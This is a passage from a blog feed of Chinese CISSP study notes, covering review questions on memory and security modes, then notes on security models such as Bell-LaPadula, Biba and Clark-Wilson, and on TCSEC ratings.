地理标记</p></li><li><p>你有三个应用程序在支持多任务处理的单核单处理器系统上运行。这些应用程序的其中一个为文字处理程序，并同时管理两个线程。其他两个应用军到芋只使用一个线程来运行。在任何给定时间有多少个应用线程在处理器上运行?<br>A. 1<br>B. 2<br>C. 3<br>D. 4</p></li><li><p>什么类型的美国联邦政府计算机系统要求所有访问系统的个人都需要知道所有由该系统处理的信息?<br>A. 专用模式<br>B. 系统高级模式<br>C. 间隔模式<br>D. 多级模式</p></li><li><p>在标准PC中不常被发现而嵌入式系统中有的安全风险是什么?<br>A. 软件缺陷<br>B. 访问互联网<br>C. 在物理环境中的控制机制<br>D. 电源丢失</p></li><li><p>什么类型的内存芯片允许最终用户仅能写入信息到内存中一次，然后永久地保存这些不可能擦除的信息?<br>A. ROM<br>B. PROM<br>C. EPROM<br>D. EEPROM</p></li><li><p>什么类型的内存芯片，当从计算机中取出并暴露在一种特殊类型的紫外光下之后，信息仅会被擦除?<br>A. ROM<br>B. PROM<br>C. EPROM<br>D. EEPROM</p></li><li><p>以下哪种类型的内存可能会保留从计算机中取出后的信息，因此也代表了安全风险?<br>A. 静态RAM<br>B. 动态RAM<br>C. 辅助存储器<br>D. 物理内存</p></li><li><p>减少移动设备上的数据丢失风险的最有效手段是什么，例如笔记本电脑?<br>A. 设置强登录密码<br>B. 减少存储在移动设备上的敏感数据<br>C. 使用一根电缆线<br>D 加密硬盘</p></li><li><p>什么类型的电气部件作为构建动态RAM 芯片的主要部分?<br>A. 电容器<br>B. 电阻器<br>C. 触发器<br>D. 晶体管</p></li><li><p>下面存储设备中的哪一个为了在网络环境中保持数据安全性，最有可能需要加密技术?<br>A. 硬盘<br>B. 备份磁带<br>C. 可移动设备<br>D. RAM</p></li><li><p>在下列哪种安全模式中，你会放心所有用户都具有通过系统处理所有信息的访问权限，但不必知道所有的信息?<br>A. 专用模式<br>B. 系统高级模式<br>C. 间隔模式<br>D. 多级模式</p></li><li><p>移动电话窃听最常被忽视的方面与下列哪些情形有关?<br>A. 存储设备加密<br>B. 锁屏<br>C. 偷昕通话<br>D. 无线网络</p></li><li><p>什么类型的存储设备通常用于包含一台计算机的主板BIOS?<br>A. PROM<br>B. EEPROM<br>C. ROM<br>D. EPROM</p></li><li><p>什么类型的存储直接提供给CPU，并且往往是CPU的一部分?<br>A. RAM<br>B. ROM<br>C. 寄存器<br>D. 虚拟内存</p></li><li><p>什么类型的寻址方案是数据实际提供给CPU作为参数传递给指令?<br>A 直接寻址<br>B. 立即寻址<br>C. 基址偏移<br>D. 间接寻址</p></li><li><p>什么类型的寻址方案支持本地CPU包含实际计算的内存地址?<br>A. 直接寻址<br>B. 立即寻址<br>C. 基址偏移<br>D. 间接寻址</p></li><li><p>哪些安全原则有助于阻止用户访问分配给其他用户用以运行应用程序的内存空间?<br>A. 特权分离<br>B. 分层<br>C. 进程隔离<br>D. 最小特权</p></li><li><p>哪些安全原则授权只有最小数量的操作系统进程时可以在监管模式下运行?<br>A. 抽象<br>B. 分层<br>C. 数据隐藏<br>D. 最小特权</p></li><li><p>哪些安全原则采用进程隔离的概念和使用物理控制来实现?<br>A. 硬件分隔<br>B. 数据隐藏<br>C. 分层<br>D. 抽象</p></li></ol>]]></content>
    
    <summary type="html">
    
      本文为cissp中安全脆弱性、威胁和对策章节的学习笔记
    
    </summary>
    
      <category term="notes" scheme="https://www.diyz.bid/categories/notes/"/>
    
    
      <category term="cissp" scheme="https://www.diyz.bid/tags/cissp/"/>
    
      <category term="学习笔记" scheme="https://www.diyz.bid/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（8）——安全模型的原则、设计和功能</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8E%9F%E5%88%99%E3%80%81%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（8）——安全模型的原则、设计和功能/</id>
    <published>2018-09-18T07:05:40.000Z</published>
    <updated>2018-10-11T10:12:52.886Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>3)安全工程(安全的工程学和管理)</p><ul><li>A. 使用安全设计原则实施和管理工程过程</li><li>B. 理解安全模型的基本概念(例如，机密性、完整性和多级模型)</li><li>C. 根据系统安全评价模型选择控制与对策</li><li>D. 理解信息系统的安全保障能力(例如，内存保护、虚拟化、信任平台模型、接口、故障容错)</li></ul><h3 id="8-1-使用安全设计原则实施和管理工程过程"><a href="#8-1-使用安全设计原则实施和管理工程过程" class="headerlink" title="8.1 使用安全设计原则实施和管理工程过程"></a>8.1 使用安全设计原则实施和管理工程过程</h3><p>　　在每一个系统的开发阶段都应该考虑安全，程序员应该努力为他们开发的每一个应用手固芋建立安全，提供更高层次的安全性给关键应用程序和那些处理敏感信息的应用程序。在开发项目的早期阶段考虑安全是非常重要的，因为它比将安全添加到现有系统中更容易实现。</p><h4 id="8-1-1-客体和主体"><a href="#8-1-1-客体和主体" class="headerlink" title="8.1.1 客体和主体"></a>8.1.1 客体和主体</h4><p>　　对安全系统中任何资源的访问控制涉及两个实体。主体是请求访问资源的用户或进程。访问的意思是可以对资源进行读或写操作。客体是用户或进程想要访问的资源。</p><h4 id="8-1-2-封闭式系统和开放式系统"><a href="#8-1-2-封闭式系统和开放式系统" class="headerlink" title="8.1.2 封闭式系统和开放式系统"></a>8.1.2 封闭式系统和开放式系统</h4><p>　　封闭式系统被设计用于与较小范围内的其他系统协同工作，通常所有系统都来自相同的制造厂商。封闭式系统的标准一般是专有的，通常不对外公开。另一方面，开放式系统被设计为使用统一的行业标准。这些开放式系统比较容易与来自不同制造厂商但支持相同标准的系统集成在一起。封闭式系统很难与不同的系统集成在一起，但是它们更为安全。封闭式系统通常由专用硬件和软件组成，这些软硬件是不符合行业标准的。缺乏容易集成的特点，意味着针对许多普通系统组件的攻击可能不起作用，或者这些攻击需要经过定制才能成功。</p><h4 id="8-1-3-用于确保机密性、完整性和可用性的技术"><a href="#8-1-3-用于确保机密性、完整性和可用性的技术" class="headerlink" title="8.1.3 用于确保机密性、完整性和可用性的技术"></a>8.1.3 用于确保机密性、完整性和可用性的技术</h4><ul><li><p>限制<br>软件设计人员使用进程限制来约束程序的操作。简单来讲，进程限制允许进程只能在确定的内存地址和资源中读取和写入数据。这就是常说的沙箱。操作系统或其他一些安全组件不允许非法的读/写请求。如果进程试图执行的动作超出了为其授予的权限，那么动作会被拒绝，并且系统将采取进一步的行动，例如记录违法行为的日志。必须符合更高安全性评级的系统通常记录所有违规行为以及通过某些具体方式做出的响应。一般情况下，违规的进程会被终止。限制可以在操作系统中进行(如通过进程隔离和保护)，也可通过限制应用程序或服务(例如，<a href="http://www.sandboxie.com的Sandboxie)的使用来进行，或通过虚拟化或虚拟机(如VMware或Oracle的VirωalBox)解决方案来进行。" target="_blank" rel="noopener">www.sandboxie.com的Sandboxie)的使用来进行，或通过虚拟化或虚拟机(如VMware或Oracle的VirωalBox)解决方案来进行。</a></p></li><li><p>界限<br>在系统上运行的每一个进程都被分配了一个授权级别。授权级别告知操作系统进程可以执行哪些操作。在比较简单的系统中，可能只存在两个授权级别： 用户和内核。授权级别告知操作系统该如何为进程设定界限。进程的界限由对进程可以访问的内存和资源所设置的限制组成。进程在界限所划定的区域之内。在大多数系统中，这些界限为每个进程划分其使用的内存逻辑区域。操作系统负责实施这些逻辑界限并且不准许其他进程访问。更安全的系统要求从物理上限制进程。物理界限要求每个被限制的进程所运行的内存区域与其他受限进程的内存区域，通过物理方式隔开而不仅仅使用相同内存空间中的逻辑界限。对内存实施物理界限可能非常昂贵，但是也比逻辑界限更为安全。</p></li><li><p>隔离<br>当通过实施访问界限对进程进行限制时，进程就运行在隔离状态中。进程隔离能够确保任何行为只影响与隔离进程有关的内存和资源。隔离用来保护操作环境、操作系统的内核和其他独立的应用程序。隔离是稳定操作系统的重要组成部分之一。隔离能防止某个应用草里芋访问只属于另一个应用程序的内存或资源，无论是好意的还是恶意的。操作系统可以提供中间服务，如剪切、粘贴和资源共享(如键盘、网络接口和存储设备访问)。</p></li></ul><p>　　上述三个概念(限制、界限和隔离)使安全程序和操作系统的设计工作变得更为困难，但能使实现更安全的系统成为可能。</p><h4 id="8-1-4-控制"><a href="#8-1-4-控制" class="headerlink" title="8.1.4 控制"></a>8.1.4 控制</h4><p>　　控制使用访问规则来限制主体对客体的访问。访问规则声明了每个主体相对应的合法客体。有两种控制： 强制访问控制和自主访问控制，分别被称为MAC(Mandatory A∞ess Control)和DAC(Discretionary Acc棚Control)。在强制访问控制中，主体和客体的静态特性被用于确定访问的容许性。每个主体所具有的特性，定义了其访问资源的许可或授权。每个客体所具有的特性，定义了其分类。不同类型的安全方法以不同的方式为资源分类。自主访问控制与强制访问控制的不同之处在于：主体具有一些定义访问客体的能力。在受到限制的情况下，自主访问控制允许主体根据需要定义访问客体的列表。这个访问控制列表作为动态的访问规则组，并且主体能够对其进行修改。更改己实施的限制，通常与主体的身份有关。根据主体的身份，可以允许主体增加或修改访问客体的规则。强制访问控制和自主访问控制都限制主体对客体的访问。访问控制的主要目的是： 通过阻止授权或未经授权主体的未授权访问，从而确保数据的机密性和完整性。</p><h4 id="8-1-5-信任与保证"><a href="#8-1-5-信任与保证" class="headerlink" title="8.1.5 信任与保证"></a>8.1.5 信任与保证</h4><p>　　可信系统是所有保护机制都协同工作的系统，从而能够在维护稳定和安全的计算环境的同时，为许多类型的用户处理敏感数据。保证被简单地定义为： 满足安全需求的可信度。保证必须被持续地维持、更新和重新验证。无论可信系统经历己知的变化还是经过大量时间，这一点都是正确的。变化往往是安全的对立面，并且常常降低安全性。保证对于不同系统是不同的，并且必须针对单独系统分别建立。不过，某些保证等级或级别可以适用于许多类型相同的系统、支持相同服务的系统或部署在相同地理位置的系统。因此，信任可以通过具体的安全功能集成到系统中，而保证是在现实世界中对安全功能的可靠性和可用性的评估。</p><h3 id="8-2-理解安全模型的基本概念"><a href="#8-2-理解安全模型的基本概念" class="headerlink" title="8.2 理解安全模型的基本概念"></a>8.2 理解安全模型的基本概念</h3><p>　　在信息安全中，模型提供了一种正式的安全策略的方式。安全模型允许设计人员将抽象语句映射为描述构建硬件和软件所需算法和数据结构的安全策略。因此，安全模型使软件设计人员能够衡量自己的设计和实现。当然，这种模型必须支持安全策略的每个部分。通过这种方式，开发人员就能确认自己的安全实现可以支持安全策略。这些模型都阐明了如何在计算机体系结构和操作系统设计中加入安全性：</p><ul><li>可信计算模型</li><li>状态机模型</li><li>信息流模型</li><li>非干扰模型</li><li>Take-Grant模型</li><li>访问控制表</li><li>Bell-LaPadula模型</li><li>Biba模型</li><li>Clark-Wilson模型</li><li>Brewer and Nash模型(也被称为Chinese Wall模型)</li><li>Goguen-Messguer模型</li><li>Sutherland模型</li><li>Graham-Denning模型</li></ul><p>　　如果某个安全的系统遵循特定的安全标准组，那么就可以说这个系统具备某种信任级别。因此，信任可以被构建在系统内，随后能够被评估、认证和认可。但是在讨论每种安全模型之前，必须建立构建大多数安全模型的基础。这个基础就是TCB(Trusted Computing Base，可信计算基础) 。</p><h4 id="8-2-1-可信计算基础"><a href="#8-2-1-可信计算基础" class="headerlink" title="8.2.1 可信计算基础"></a>8.2.1 可信计算基础</h4><p>　　TCB是完整信息系统的一个子集，并且应当尽可能小，从而使详细的分析能够确保系统满足设计规范和要求。TCB是系统可以信任的遵守和实施安全策略的唯一部分。系统的每个组件并不需要都是可信任的。不过，从安全性的角度考虑系统时，评估中应该包括定义系统TCB的所有可信组件。</p><ul><li><p>安全边界<br>系统的安全边界是一条假想的界限，它将TCB与系统的其他部分隔开。这条边界确保TCB与计算机系统中其他部件的不安全通信或交互不会发生。因为TCB要与系统的其他部分进行通信，所以安全边界必须建立安全的通道，也被称为可信路径。可信路径是建立在有着严格标准基础上的通道，在不受TCB安全脆弱性影响的情况下准许进行必要的通信。可信路径也保护系统用户(有时也称为主体)不受因TCB交换导致的危害。</p></li><li><p>引用监控器和内核<br>在实现安全系统时，必须利用TCB的某部分来实施针对系统资产和资源(有时称为客体)的访问控制。在准许访问请求之前验证对每种资源的访问的这部分TCB被称为引用监控器。引用监控器处于每个主体和客体之间，并且在准许进行任何访问请求之前验证请求主体的凭证是否满足客体的访问需求。如果不满足这种访问需求，那么访问请求就会被拒绝。实际上，引用监控视器是TCB的访问控制执行者。因此，授权和安全的行动和活动被允许发生，而未经授权的和不安全的活动和行动被拒绝并阻止发生。引用监控器对访问控制或授权的强制基于所需的安全模型，无论是自由支配的、强制性的、基于角色的还是访问控制的一些其他形式。引用监控器可能是TCB概念的一部分;它并不需要是一个实际的、独立的或独立工作的系统组成部分。</p></li></ul><img src="/notes/cissp学习笔记（8）——安全模型的原则、设计和功能/TCB、安全边界和引用监控器.png"><p>　　共同工作从而实现引用监控器功能的TCB 中组件的集合被称为安全内核。引用监控器是一种通过软件和硬件中的安全实现来实施的概念或理论。安全内核的目的是使用适当的组件实施引用监控器的功能和抵抗所有己知的攻击。安全内核使用一条可信路径与主体进行通信，并且还可以作为所有资源访问请求的中间人，从而只允许那些与系统应用的适当访问规则相匹配的请求。引用监控器要求具有与其保护的每种资源相关的描述性信息。这种信息通常包括资源的分类级别和名称。当某个主体请求访问某个客体时，引用监控器会查阅客体的描述性信息，从而判断应当准许或拒绝访问。</p><h4 id="8-2-2-状态机模型"><a href="#8-2-2-状态机模型" class="headerlink" title="8.2.2 状态机模型"></a>8.2.2 状态机模型</h4><p>　　状态机模型描述了一个无论处于何种状态下总是安全的系统，这种模型基于有限状态机(Finite State Machine，FSM)的计算机科学定义。FSM通过组合外部输入和内部计算机状态来建立所有类型的复杂系统的模型，包括解析器、解码器和解释器。给定一个输入和一个状态，FSM 就会转换至另一个状态，并且可能生成一个输出。从数学上讲，下一状态是当前状态和输入的函数： 下一状态=F(输入，当前状态)。同样，输出也是输入和当前状态的函数： 输出=F(输入，当前状态)。<br>　　如果某个状态的所有方面都满足安全策略的要求，那么这个状态就被认为是安全的。接受输入或生成输出时都会发生转换操作。转换操作总是会产生新的状态(也被称为状态转换)。所有的状态转换都必须进行评估。如果每个可能的状态转换都会导致另一个安全状态，那么系统就会被称为安全状态机。安全状态机模型系统，总是会进入一个安全状态(在所有的转换中维护安全状态)，并且准许主体只以遵循安全策略的安全方式访问资源。安全状态机模型是其他许多安全模型的基础。</p><h4 id="8-2-3-信息流模型"><a href="#8-2-3-信息流模型" class="headerlink" title="8.2.3 信息流模型"></a>8.2.3 信息流模型</h4><p>　　信息流模型以状态机模型为基础。信息流模型被设计用于避免未授权的、不安全的或受限的信息流。信息流模型可以防止未经授权的所有信息流，无论是在同一分类级别不同的分类级别之间。在相同客体的两种版本或状态存在于不同的时间点时，信息流模型被用于建立这两种版本或状态之间的关系。因此，信息流指示了客体从某个时间点的一个状态向另一个时间点的另一个状态的转变。信息流模型也可通过排除所有不确定的流途径来解决隐敲通道。</p><h4 id="8-2-4-无干扰模型"><a href="#8-2-4-无干扰模型" class="headerlink" title="8.2.4 无干扰模型"></a>8.2.4 无干扰模型</h4><p>　　无干扰模型松散地建立在信息流模型的基础上。然而，无干扰模型关注的是位于较高安全级别的主体的动作如何影响系统状态，或关注于位于较低安全级别的主体的动作，而不是关注于信息流。</p><h4 id="8-2-5-Take-Grant模型"><a href="#8-2-5-Take-Grant模型" class="headerlink" title="8.2.5 Take-Grant模型"></a>8.2.5 Take-Grant模型</h4><p>　　Take-Grant模型采用有向图来指示权限如何从一个主体传递至另一个主体或者如何从一个主体传递至一个客体。<br><br>　　具有授权资格的主体可以向另一个主体或客体授予其所拥有的其他任何权限。同样，具有获得权限能力的主体可以从另一个主体获得权限。除了这两条主要的规则，Take-Grant(取-予)模型可采取创建规则和移除规则来生成或删除权限。这种模型的关键是使用这些规则可以让你弄清楚在系统中哪些权限可以改变，哪些可能发生泄漏(即许可权限的意外分自己)，如下表：</p><table><thead><tr><th>规格名</th><th>作用</th></tr></thead><tbody><tr><td>获取规则</td><td>允许主体获取客体的权限</td></tr><tr><td>授予规则</td><td>允许主体向客体授予权限</td></tr><tr><td>创建规则</td><td>允许主体创建新权限</td></tr><tr><td>移除规则</td><td>允许主体移除己有的权限</td></tr></tbody></table><h4 id="8-2-6-访问控制矩阵"><a href="#8-2-6-访问控制矩阵" class="headerlink" title="8.2.6 访问控制矩阵"></a>8.2.6 访问控制矩阵</h4><p>　　访问控制矩阵是一个由主体和客体组成的表，这个表指示了每个主体可以对每个客体执行的动作或功能。访问控制矩阵的每一列都是一个访问控制列表： 表的每一行都是功能列表。ACL与客体相关，它列出了每个主体可以执行的有效动作。功能列表与主体相关，它列出了可以在所有客体上执行的有效动作。</p><h4 id="8-2-7-Bell-LaPadula模型"><a href="#8-2-7-Bell-LaPadula模型" class="headerlink" title="8.2.7 Bell-LaPadula模型"></a>8.2.7 Bell-LaPadula模型</h4><p>　　为了解决保护分类信息的问题，美国国防部(Department ofDefense，DoD)在20 世纪70 年代开发了Bell-LaPadula模型。Bell-LaPadula模型通过阻止较低分类级别的主体访问较高分类级别的客体，防止了分类信息泄漏或传输至较低的安全许可级别，解决了确保文档机密性所涉及的复杂性问题。然而，Bell-LaPadula模型没有说明客体的完整性或可用性方面的内容。Bell-LaPadula模型也是多级安全策略的首个数学模型。<br>　　Bell-LaPadula模型以状态机概念和信息流模型为基础。这种模型还采用强制访问控制和格子型概念。格子等级是由组织机构的安全策略使用的分类级别。状态机支持在任何两个状态之间都能够显式转换多个状态; 使用这个概念是因为能够以数学方式证明计算机的正确性以及对文档机密性的保证。这种状态机具有下列三种属性：</p><ul><li>简单安全属性(simple security property)规定主体不能读取位于较高敏感度级别的信息(也就是不能向上读)。</li><li><em>安全属性(</em>(star)security prope即)规定主体不能在位于较低敏感度级别的客体上写入信息(也就是不能向下写)，这也被称为约束属性(confinement property)。</li><li>自主安全属性(discretionary security property)规定系统使用访问控制矩阵来实施自主访问控制。</li></ul><p>　　前两个属性定义了系统可能转换到的状态。其他的转换都是不被准许的。所有通过这些规则可以访问的状态都是安全状态。因此，Bell-LaPadula模型系统提供了状态机模型的安全性。<br>　　Bell-LaPadula属性有效地保护了数据的机密性。主体不能读取分类级别高于其级别的客体。因为一个级别上的客体所具有的数据比较低级别上的数据更为敏感或秘密，所以主体不能将某个级别的数据写入较低级别的客体(除了可信主体之外)。这个动作类似于将绝密备注粘贴到非机密的文档文件中。此外，第三种属性实施了主体能够访问客体的”知其所需”权限。<br>　　Bell-LaPadula模型只解决数据的机密性问题，但是没有涉及数据的完整性和可用性。不支持目前常见的许多操作，例如文件共享和网络连接。这种模型还说明了安全层之间的安全转换，但是并没有涉及隐蔽通道问题。Bell-LaPadula模型很好地处理了机密性问题，因此常常与其他处理完整性和可用性机制的模型组合使用。</p><h4 id="8-2-8-Biba模型"><a href="#8-2-8-Biba模型" class="headerlink" title="8.2.8 Biba模型"></a>8.2.8 Biba模型</h4><p>　　Biba模型是仿照Bell-LaPadula模型设计的。Bell-LaPadula模型解决了机密性问题，而Biba模型则解决了完整性问题。二者的最大差异是关注的主要目标不同： Biba模型主要保护数据的完整性。下面列出了Biba模型状态机的基本属性：</p><ul><li>简单完整性属性(simple integrity property)规定主体不能读取位于较低完整性级别的客体(也就是不能向下读)。</li><li><em>完整性属性(</em>(star)integrity property)规定主体不能更改位于较高完整性级别的客体(也就是不能向上写) 。</li></ul><p>　　Biba模型被设计用于解决下列三个完整性问题：</p><ul><li>防止未授权的主体对客体的修改。</li><li>防止己授权的主体对客体进行未授权的修改。</li><li>保护内部和外部客体的一致性。</li></ul><p>　　Biba模型有以下列几个缺陷：</p><ul><li>只解决了完整性问题，没有解决机密性或可用性问题。</li><li>专注于保护客体不受外部的威胁; 假定内部的威胁己被有计划地控制。</li><li>没有说明访问控制管理，也没有提供分配或改变主体或客体分类级别的方法。</li><li>并没有防止隐蔽通道。</li></ul><h4 id="8-2-9-Clark-Wilson模型"><a href="#8-2-9-Clark-Wilson模型" class="headerlink" title="8.2.9 Clark-Wilson模型"></a>8.2.9 Clark-Wilson模型</h4><p>　　这种模型使用多层面途径来实施数据完整性。Clark-Wilson模型没有定义正式的状态机，而是只通过一小组程序来定义每个数据项井允许修改。Clark-Wilson模型并不要求使用格子型结构，而是使用被称为三元组或访问控制三元组的主体/程序/客体(或主体/事物/客体)的三部分关系。主体并不对客体进行直接访问。客体只能通过程序进行访问。通过使用下列两条原则： 格式良好的事务处理和职责分离，Clark-wilson模型提供了保护完整性的有效方法。Clark-Wilson模型定义了下列数据项和过程：</p><ul><li>约束数据项(Constrained Data Item，CDI)：是指完整性由安全模型保护的任何数据项。</li><li>非约束数据项(Unconstrained Data Item，UDI)：是指不受安全模型控制的任何数据项。作为输入且未验证的任何数据或任何输出都被视为非约束数据项。</li><li>完整性验证过程(lntegrity Verification Procedure，IVP)：扫描数据项并确认其完整性的过程。</li><li>转换过程(Transformation Pro臼dure，TP)：TP是允许更改CDI的唯一过程。通过TP限制对CDI的访问而形成Clark-Wilson完整性模型的主干(我们想知道这是否是TPS报告的来源)。</li></ul><p>　　Clark-Wilson模型使用安全标签来授予对客体的访问权限，但是只能通过转换过程和受限接口模型来完成。受限接口模型使用基于分类的限制，并且只提供主体特定的授权信息和功能。Clark-Wilson模型实现了职责分离。</p><h4 id="8-2-10-Brewer-and-Nash模型-也叫作Chinese-Wall"><a href="#8-2-10-Brewer-and-Nash模型-也叫作Chinese-Wall" class="headerlink" title="8.2.10 Brewer and Nash模型(也叫作Chinese Wall)"></a>8.2.10 Brewer and Nash模型(也叫作Chinese Wall)</h4><p>　　创建这种模型的目的是准许访问控制基于用户以前的活动而动态改变(这也使其成为一种状态机模型)。这种模型应用于单个集成的数据库，并且试图创建对利益冲突敏感的安全域。因为创建了一个数据类，这个数据类定义了哪些安全域存在潜在的冲突，对于能够访问某个属于特定冲突类的安全域的任何主体，阻止他们访问属于相同冲突类的其他任何安全域，所以这种模型被称为Chinese Wall模型。</p><h4 id="8-2-11-Goguen-Meseguer模型"><a href="#8-2-11-Goguen-Meseguer模型" class="headerlink" title="8.2.11 Goguen-Meseguer模型"></a>8.2.11 Goguen-Meseguer模型</h4><p>　　Goguen-Meseguer模型是一个完整性模型，这个模式被称作非干涉概念理论的基础。Goguen-Meseguer 模型基于主体可以访问的预设的域或客体列表。该模型基于自动化理论和域的隔离。这意味着主体只允许对预设客体执行预定的动作。当类似的用户被分组到他们自己的域(也就是集合)时，一个主体域的成员不能干扰另一个主体域的成员。因此，客体无法干扰其他客体的活动。</p><h4 id="8-2-12-Sutherland模型"><a href="#8-2-12-Sutherland模型" class="headerlink" title="8.2.12 Sutherland模型"></a>8.2.12 Sutherland模型</h4><p>　　Sutherland 模型是一个完整性模型。它的重点是预防对完整性支持的干扰。它正式地基于状态机模型和信息流模型。然而，它并没有直接表明保护完整性的具体机制。相反，该模型基于定义一组系统状态的想法，以及初始状态和状态转换。通过使用这些预定的安全状态来保护完整性和阻止干扰。</p><h4 id="8-2-13-Graham-Denning模型"><a href="#8-2-13-Graham-Denning模型" class="headerlink" title="8.2.13 Graham-Denning模型"></a>8.2.13 Graham-Denning模型</h4><p>　　Graham-Denning模型关注主体和客体在创建和删除时的安全性。Graham-Denning模型集合了8个主要的定义特定安全行为边界的保护规则或动作：</p><ul><li>安全创建客体</li><li>安全创建主体</li><li>安全删除客体</li><li>安全删除主机</li><li>安全读访问权限</li><li>安全授予访问权限</li><li>安全删除访问权限</li><li>安全转移访问权限</li></ul><p>　　通常，一组客体上的主体的特定能力或权限被定义在访问矩阵中(又名访问控制矩阵)。</p><h3 id="8-3-基于系统安全评估模型选择控制和对策"><a href="#8-3-基于系统安全评估模型选择控制和对策" class="headerlink" title="8.3 基于系统安全评估模型选择控制和对策"></a>8.3 基于系统安全评估模型选择控制和对策</h3><h4 id="8-3-1-彩虹系列"><a href="#8-3-1-彩虹系列" class="headerlink" title="8.3.1 彩虹系列"></a>8.3.1 彩虹系列</h4><p>　　自20世纪80年代以来，政府、机构、团体和各种商业组织都不得不面对涉及信息系统挑选和使用的风险。这种情况导致近年来出现了一系列信息安全标准，这些标准试图为各种使用类别指定最低的可接受安全标准。当购买者希望获得和部署能够保护和保留其内容，或者能够满足各种强制安全需求(例如，承办商管理与政府相关的业务时按手续必须满足的需求)的系统时，这些使用类别十分重要。在美国国防部(DoD)致力于为购买和使用的系统开发和实施安全标准时，第一组这样的标准导致在20世纪80年代出现可信计算机系统评估标准(TCSEC)。随后，在20世纪90年代中期，这个系列的所有标准都被公布出来。因为往往可以通过封面颜色来标识这些被公布的标准，所以它们被合称为彩虹系列。</p><h4 id="8-3-2-TCSEC分类和所需功能"><a href="#8-3-2-TCSEC分类和所需功能" class="headerlink" title="8.3.2 TCSEC分类和所需功能"></a>8.3.2 TCSEC分类和所需功能</h4><p>　　TCSEC将系统提供的功能性和机密性保护等级保证组合为4个主要类别。这些类别随后又被进一步划分为使用数字标识的子类别(例如，C1和C2)。进一步说，TCSEC的类别是通过对目标系统的评估来指派。TCSEC适用的系统是没有互联的独立系统。TCSEC定义了下列主要类别：</p><ul><li><strong>类别A</strong> 己验证保护，这是最高的安全级别</li><li><strong>类别B</strong> 强制性保护</li><li><strong>类别C</strong> 自主性保护</li><li><strong>类别D</strong> 最小化保护，提供给那些被评估但不符合要求且属于其他类别的系统定级之用</li></ul><table><thead><tr><th>级别标签</th><th>需求</th></tr></thead><tbody><tr><td>D</td><td>最小化保护</td></tr><tr><td>C1</td><td>自主性保护</td></tr><tr><td>C2</td><td>受控访问保护</td></tr><tr><td>B1</td><td>标签式安全</td></tr><tr><td>B2</td><td>结构化保护</td></tr><tr><td>B3</td><td>安全域</td></tr><tr><td>A1</td><td>已验证保护</td></tr></tbody></table><ul><li><strong>自主性保护(类别C1、C2)</strong> 自主性保护系统提供了基本的访问控制。这个类别中的系统的确能提供一些安全控制方法，但是缺乏针对安全系统特定需要的更复杂且更严格的控制方法。C1和C2类别的系统提供了基本的控制和用于系统安装与配置的完整文档。<ul><li><strong>自主性安全保护(类别C1)</strong> 自主性安全保护系统通过用户D和/或用户组来实现访问控制。虽然对客体的访问采取了一些控制措施，但这个类别中的系统只能提供较弱的保护。</li><li><strong>受控访问保护(类别C2)</strong> 受控访问保护系统的安全性强于C1系统。用户必须被单独标识后才能获得访问客体的权限。C2系统还必须实施介质清除措施。如果实施了介质清除措施，那么在另一位用户重新使用介质之前，必须首先彻底地清除介质上的内容，从而保证不会保留先前的数据供检查和使用。此外，也必须实施限制无效或未授权用户访问的严格登录措施。</li></ul></li><li><strong>强制性保护(类别B1、B2、B3)</strong> 强制性保护系统比类别C或D的系统提供了更多的安全控制方法。因为强制实施了更细粒度的控制，所以安全管理员能够应用只允许非常有限的主体/客体组访问的特定控制手段。这个系统类别以Bell-LaPadula模型为基础。强制访问控制基于安全标签。<ul><li><strong>标签式安全(类别B1)</strong> 在标签式安全系统中，每个主体和客体都有一个安全标签。通过匹配主体和客体的标签并比较它们的权限兼容性，B1系统授予了访问权限。B1系统提供了足够的安全保护来保留己分类的数据。</li><li><strong>结构化保护(类别B2)</strong> 除了要求具有安全标签之外(就像在B1系统中一样)，B2系统必须确保不存在隐蔽通道。操作者和管理员的职责被分隔开，并且进程也被隔离。如果分类数据需要高于B1系统的安全功能性，B2系统可以满足需要。</li><li><strong>安全域(类别B3)</strong> 通过进一步增加无关进程的分隔和隔离，安全域系统提供了更多的安全功能性。管理功能被清楚地定义并与其他用户可以使用的功能分开。B3系统的关注点转移到简易性，从而减少了在未用的或多余的代码中所暴露出来的脆弱性。因系统的安全状态也必须在初始启动过程中被说明。因系统难以被成功攻击，并且为非常敏感的或秘密的数据提供了充分的安全控制。</li></ul></li><li><strong>己验证保护(类别A1)</strong> 己验证保护系统在结构和使用的控制方面与B3系统类似。二者的差别在于开发周期。开发周期的每个阶段都使用正式的方法进行控制。在执行下一个步骤之前，设计的每个阶段都要被记入文档、评估和验证。在开发和部署的所有阶段都给予极高的安全关注度，并且是正式保证系统强安全性的唯一方式。</li></ul><h4 id="8-3-3-彩虹系列中的其他颜色"><a href="#8-3-3-彩虹系列中的其他颜色" class="headerlink" title="8.3.3 彩虹系列中的其他颜色"></a>8.3.3 彩虹系列中的其他颜色</h4><ul><li><strong>红皮书</strong> 因为桶皮书只应用于未连接到网络的独立计算机，而如此多的系统却连接到网络(即使在20世纪80年代也是如此)，所以红皮书被开发出来用于在网络互联环境中解释说明TCSEC。事实上，红皮书的正式标题是”可信网络解释”，因此可以被视为致力于从网络连接角度对桶皮书进行解释说明。下面列出了红皮书的其他一些功能：<ul><li>评定机密性和完整性的等级</li><li>解决通信的完整性问题</li><li>解决拒绝服务的防护问题</li><li>解决危害(也就是入侵)的防护和阻止问题</li><li>受限于被标记为”使用单个鉴定授权的集中式网络”的有限网络类别</li><li>只使用4种等级级别：None、Cl(Minimum)、C2(Fair)以及B2(Good)。</li></ul></li><li><strong>绿皮书</strong> 绿皮书或者称为”美国国防部密码管理指导原则”提供了创建和管理密码的指导原则。对于配置和管理可信系统的人来说，绿皮书十分重要。</li></ul><p>　　下面提供了彩虹系列的一个更完整的书籍列表：</p><table><thead><tr><th>发表编号</th><th>标题</th><th>名称</th></tr></thead><tbody><tr><td>5200.28-STD</td><td>DoD可信计算机系统评估标准</td><td>橘皮书</td></tr><tr><td>CSC-STD-002-85</td><td>DoD 